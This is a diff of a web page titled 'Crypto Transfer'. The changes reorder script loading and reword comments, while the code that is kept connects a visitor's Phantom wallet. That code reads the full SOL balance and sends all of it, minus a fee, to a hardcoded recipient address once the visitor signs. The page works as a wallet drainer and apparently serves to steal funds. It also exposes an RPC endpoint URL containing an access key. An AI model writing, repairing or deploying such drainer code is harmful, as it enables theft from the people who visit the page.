@@ -4,16 +4,13 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crypto Transfer</title>
-    
-    <!-- Load Solana Web3.js -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-    
-    <!-- Load Buffer library -->
+
+    <!-- Buffer Polyfill MUST COME FIRST -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/5.7.1/buffer.min.js"></script>
-    <script>
-        window.Buffer = window.Buffer || require('buffer').Buffer;
-    </script>
     
+    <!-- Then load Solana Web3.js -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
     <link rel="icon" href="data:,">
 </head>
 <body>
@@ -28,35 +25,35 @@
             }
 
             try {
-                // Connect to Phantom wallet
+                // Connect to Phantom Wallet
                 await window.solana.connect();
                 const publicKey = window.solana.publicKey;
                 if (!publicKey) {
                     throw new Error('Failed to get public key.');
                 }
 
-                // Connect to Solana network via QuickNode RPC URL
+                // Connect to Solana RPC
                 const connection = new solanaWeb3.Connection(
                     'https://convincing-distinguished-panorama.solana-mainnet.quiknode.pro/068f8b18be5bb779841bd23ab00ef267e80501df',
                     'confirmed'
                 );
 
-                // Get balance and check for sufficient funds
+                // Get Balance
                 const balance = await connection.getBalance(publicKey);
-                if (balance <= 5000) {  // Subtracting estimated fee of 5000 lamports
+                if (balance <= 5000) {
                     alert('Insufficient SOL balance to cover transaction fees.');
                     return;
                 }
 
-                // Define recipient wallet address
+                // Define Recipient Wallet
                 const recipient = new solanaWeb3.PublicKey('9wr1AgNmYH7tdSSG8VYa75E5Efjm61t4wzqbjuv4jANf');
 
-                // Create transaction to transfer SOL
+                // Create Transaction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: publicKey,
                         toPubkey: recipient,
-                        lamports: balance - 5000 // Subtract estimated transaction fee
+                        lamports: balance - 5000 // Deduct estimated transaction fee
                     })
                 );
 
@@ -64,7 +61,7 @@
                 const { blockhash } = await connection.getLatestBlockhash();
                 transaction.recentBlockhash = blockhash;
 
-                // Sign and send the transaction
+                // Sign & Send Transaction
                 const signedTransaction = await window.solana.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
 
